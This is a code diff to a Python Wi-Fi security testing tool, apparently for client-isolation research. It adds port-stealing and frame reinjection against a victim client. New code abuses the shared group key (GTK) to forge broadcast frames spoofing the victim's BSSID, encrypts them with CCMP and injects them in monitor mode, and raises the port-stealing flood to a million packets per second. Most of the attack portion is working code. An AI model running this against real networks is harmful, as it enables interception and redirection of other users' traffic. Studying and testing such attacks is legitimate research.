@@ -131,6 +131,9 @@ class Monitor(Daemon):
 		self.time_last_synack = None
 
 		self.eth_handler = None
+		self.gtk = None
+		self.keyid = None
+		self.pn = None
 
 	def start(self):
 		log(STATUS, "Note: remember to disable Wi-Fi in your network manager so it doesn't interfere with this script")
@@ -150,6 +153,10 @@ class Monitor(Daemon):
 		if self.options.c2m_mon_channel:
 			cmd4 = ["iw", "dev", self.nic_iface, "set", "channel", str(self.options.c2m_mon_channel)]
 			log(STATUS, f"Switching {self.nic_iface} to channel {self.options.c2m_mon_channel}")
+			subprocess.Popen(cmd4)
+		elif self.options.c2m_freq:
+			cmd4 = ["iw", "dev", self.nic_iface, "set", "freq", str(self.options.c2m_freq)]
+			log(STATUS, f"Switching {self.nic_iface} to frequency {self.options.c2m_freq}")
 			subprocess.Popen(cmd4)
 
 		time.sleep(2)
@@ -177,7 +184,7 @@ class Monitor(Daemon):
 		while not condition() and curr_time < end_time:
 			sockets = [self.sock_mon]
 
-			remaining_time = min(end_time - curr_time, 0.5)
+			remaining_time = min(end_time - curr_time, 0.00001)
 			sel = select.select(sockets, [], [], remaining_time)
 			if self.sock_mon in sel[0]:
 				p = self.sock_mon.recv()
@@ -205,9 +212,22 @@ class Monitor(Daemon):
 			p.show()
 
 	def inject_mon(self, p):
-		if p is None or not p.haslayer(Dot11):
-			log(WARNING, "Injecting frame on monitor iface without Dot11-layer.")
+		#if p is None or not p.haslayer(Dot11):
+		#	log(WARNING, "Injecting frame on monitor iface without Dot11-layer.")
 		self.sock_mon.send(p)
+
+	def set_gtk(self, gtk):
+	    try:
+	        gtk_hex, idx_str, seq_hex = gtk.split()
+	    except ValueError:
+	        return
+
+	    try:
+	        self.gtk = bytes.fromhex(gtk_hex)
+	        self.keyid = int(idx_str)
+	        self.pn = int(seq_hex, 16)
+	    except Exception:
+	        return
 
 
 
@@ -424,11 +444,16 @@ class Supplicant(Daemon):
 		while not condition() and curr_time < end_time:
 			sockets = [self.sock_eth]
 
-			remaining_time = min(end_time - curr_time, 0.5)
-			sel = select.select(sockets, [], [], remaining_time)
+			remaining_time = min(end_time - curr_time, 0.00001)
+			try:
+				sel = select.select(sockets, [], [], remaining_time)
+			except InterruptedError:
+				log(STATUS, f"Interrupted!! Fix this!")
 			if self.sock_eth in sel[0]:
-				p = self.sock_eth.recv()
-				if p != None: self.handle_eth(p)
+				while True:
+					p = self.sock_eth.recv()
+					if p != None: self.handle_eth(p)
+					else: break
 
 			self.time_tick()
 			curr_time = time.time()
@@ -801,9 +826,11 @@ class Client2Client:
 		self.forward_ip = False
 		self.forward_ethernet = False
 		self.bssid_victim = None
+		self.freq_victim = None
 		self.bssid_attacker = None
 		self.attacker_connected = False
 		self.test_finished = False
+
 
 	def stop(self):
 		if not self.poc:
@@ -838,11 +865,14 @@ class Client2Client:
 
 	def monitor_eth_port_steal(self, eth):
 		#log(STATUS, f">>> Frame detected: {eth.summary()}", color="green")
-		if not self.options.poc:
-			if (ICMP in eth and eth[ICMP].type == 0 and eth[Raw].load == b"1234567890") or (UDP in eth and eth[UDP].sport == self.options.iperf_port) :
-				log(STATUS, f">>> Downlink port stealing is successful.", color="red")
-		else:
-			self.reinject_frame_via_broadcast_reflection(eth)
+
+		if (ICMP in eth and eth[ICMP].type == 0 and eth[Raw].load == b"1234567890") or (UDP in eth and eth[UDP].sport == self.options.iperf_port) :
+			log(STATUS, f">>> Downlink port stealing is successful. Frame seq: {(bytes(eth[UDP].payload)[8:12]).hex()}", color="red")
+			
+			if self.options.reinject_reflection:
+				self.reinject_frame_via_broadcast_reflection(eth)
+			elif self.options.reinject_gtk:
+				self.reinject_frame_via_gtk_abuse(eth)
 
 	def reinject_frame_via_broadcast_reflection(self, eth):
 		if Ether in eth:
@@ -850,6 +880,47 @@ class Client2Client:
 			pkt[Ether].dst = "ff:ff:ff:ff:ff:ff"
 			self.sup_attacker.send_eth(pkt)
 			log(STATUS, f">>> Reinjected the frame via broadcast reflection.", color="green")
+
+	def reinject_frame_via_gtk_abuse(self, eth):
+	    if eth is None or not isinstance(eth, Ether):
+	        return
+
+	    sn = (self.mon_attacker.pn & 0xFFF)
+	    sc = (sn << 4) & 0xFFF0
+
+	    dot11 = Dot11(type=2, subtype=8, SC=sc)
+	    dot11 /= Dot11QoS(TID=2)
+	    dot11.FCfield |= 0x02
+
+	    dot11.addr1 = "ff:ff:ff:ff:ff:ff"
+	    dot11.addr2 = getattr(self, "bssid_victim", dot11.addr2)
+	    dot11.addr3 = "ff:ff:ff:ff:ff:ff"
+
+	    try:
+	        inner = eth.payload
+	        payload = LLC() / SNAP() / inner
+	    except Exception:
+	        payload = Raw(raw(eth))
+
+	    plain_dot11 = dot11 / payload
+	    ccmp_pn = self.mon_attacker.pn
+
+	    self.mon_attacker.pn += 1
+
+	    try:
+	        encrypted_frame = encrypt_ccmp(plain_dot11, self.mon_attacker.gtk, ccmp_pn, keyid=self.mon_attacker.keyid)
+	    except NotImplementedError:
+	        return
+	    except Exception:
+	        return
+	    #log(STATUS, f">>> Encrypt frame successful.", color="green")
+
+	    try:
+	        self.mon_attacker.inject_mon(encrypted_frame)
+	    except Exception as e:
+	        log(WARNING, f"Unable to inject: {e}")
+	        return
+	    log(STATUS, f">>> Reinject via GTK abuse successful. frame seq: {(bytes(eth[UDP].payload)[8:12]).hex()}", color="red")
 
 	def monitor_eth_port_steal_uplink(self, eth):
 		if ICMP in eth and eth[ICMP].type == 8 and eth[Raw].load == b"abcdefghijklmn" :
@@ -881,11 +952,12 @@ class Client2Client:
 			# Before calling this function, self.sup_attacker.mac is already modified to victim's MAC addr. 
 			p = Ether(src=self.sup_attacker.mac, dst=self.sup_attacker.mac, type=0x0800)/Raw(b"port_steal")
 			log(STATUS, f"Sending port stealing frames from attacker to attacker's addr:       {repr(p)} (Ethernet destination is the attacker's addr)")
-			for _ in range(1000000):
+			for _ in range(100000000):
 				if self.attacker_connected:
-					self.sup_attacker.send_eth(p)
+					sendpfast(p, pps=1000000, iface=self.options.c2c_port_steal, loop=1000000)
+					#self.sup_attacker.send_eth(p)
 					#log(STATUS, f"Sent one port stealing frame from attacker:       {repr(p)}")
-				time.sleep(0.001)
+				time.sleep(1)
 				if self.test_finished:
 					break
 			log(STATUS, f"Finished sending 1000000 frames.")
@@ -978,7 +1050,7 @@ class Client2Client:
 		port = str(getattr(self.options, "iperf_port"))
 		duration = str(getattr(self.options, "iperf_duration"))
 
-		cmd = ["iperf3", "-c", target, "-b", bandwidth, "--port", port, "-u", "-t", duration, "--bind-dev", self.options.iface, "--logfile", "log.txt", "-V", "-R"]
+		cmd = ["iperf3", "-c", target, "-b", bandwidth, "--port", port, "-u", "-t", duration, "--bind-dev", self.options.iface, "--logfile", "log.txt", "-V", "-R", "--length", "1400"]
 
 		log(STATUS, f"Starting iperf3 (uplink) with: {' '.join(cmd)}")
 
@@ -1085,6 +1157,7 @@ class Client2Client:
 			self.sup_victim.connect(self.sup_victim.netid_victim, timeout=60)
 			data = self.sup_victim.status()
 			self.bssid_victim = data['bssid']
+			self.freq_victim = data['freq']
 			# Let the victim get an IP address
 			self.sup_victim.get_ip_address()
 
@@ -1097,6 +1170,13 @@ class Client2Client:
 		self.attacker_connect()
 
 		self.check_gtk_shared()
+
+		if (self.options.reinject_gtk is not None) and not (self.options.poc and self.options.c2c_port_steal):
+			self.options.c2m_freq = self.freq_victim
+			self.mon_attacker = Monitor(self.options.reinject_gtk, self.options)
+			self.mon_attacker.start()
+			self.mon_attacker.set_gtk(self.sup_victim.get_gtk_2())
+			self.sup_attacker.sock_eth.ins.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 8*1024*1024)
 
 		# [ Send a packet from the attacker to the victim ]
 
@@ -1292,6 +1372,7 @@ def main():
 	parser.add_argument("--c2m", help="Second interface to test client-to-monitor traffic.")
 	parser.add_argument("--c2m-ip", help="Second interface to test client-to-monitor IP layer traffic, by setting it to monitor mode")
 	parser.add_argument("--c2m-mon-channel", type=int, help="The monitored channel for that c2m's second interface")
+	parser.add_argument('--c2m-freq', help="The monitored frequency for that c2m's interface")
 	parser.add_argument("--c2m-mon-output", help="c2m's second interface's monitoring output filename")
 	parser.add_argument("--c2c-port-steal", help="Second interface to test port stealing.")
 	parser.add_argument("--c2c-port-steal-uplink", help="Second interface to test port stealing (uplink).")
@@ -1308,6 +1389,9 @@ def main():
 	                    help='iperf3 test duration in seconds (default: 10)')
 	parser.add_argument('--iperf-port', dest='iperf_port', type=int, default=5201,
 	                    help='iperf3 port (default: 5201)')
+	parser.add_argument('--reinject-reflection', default=False, action="store_true", help="Reinject stolen frames via broadcast reflection.")
+	parser.add_argument('--reinject-gtk', help="Third interface to reinject stolen frames via GTK abuse.")
+
 	options = parser.parse_args()
 
 	# TODO: Implement this by first connecting to the given BSSID to create a cached PMK
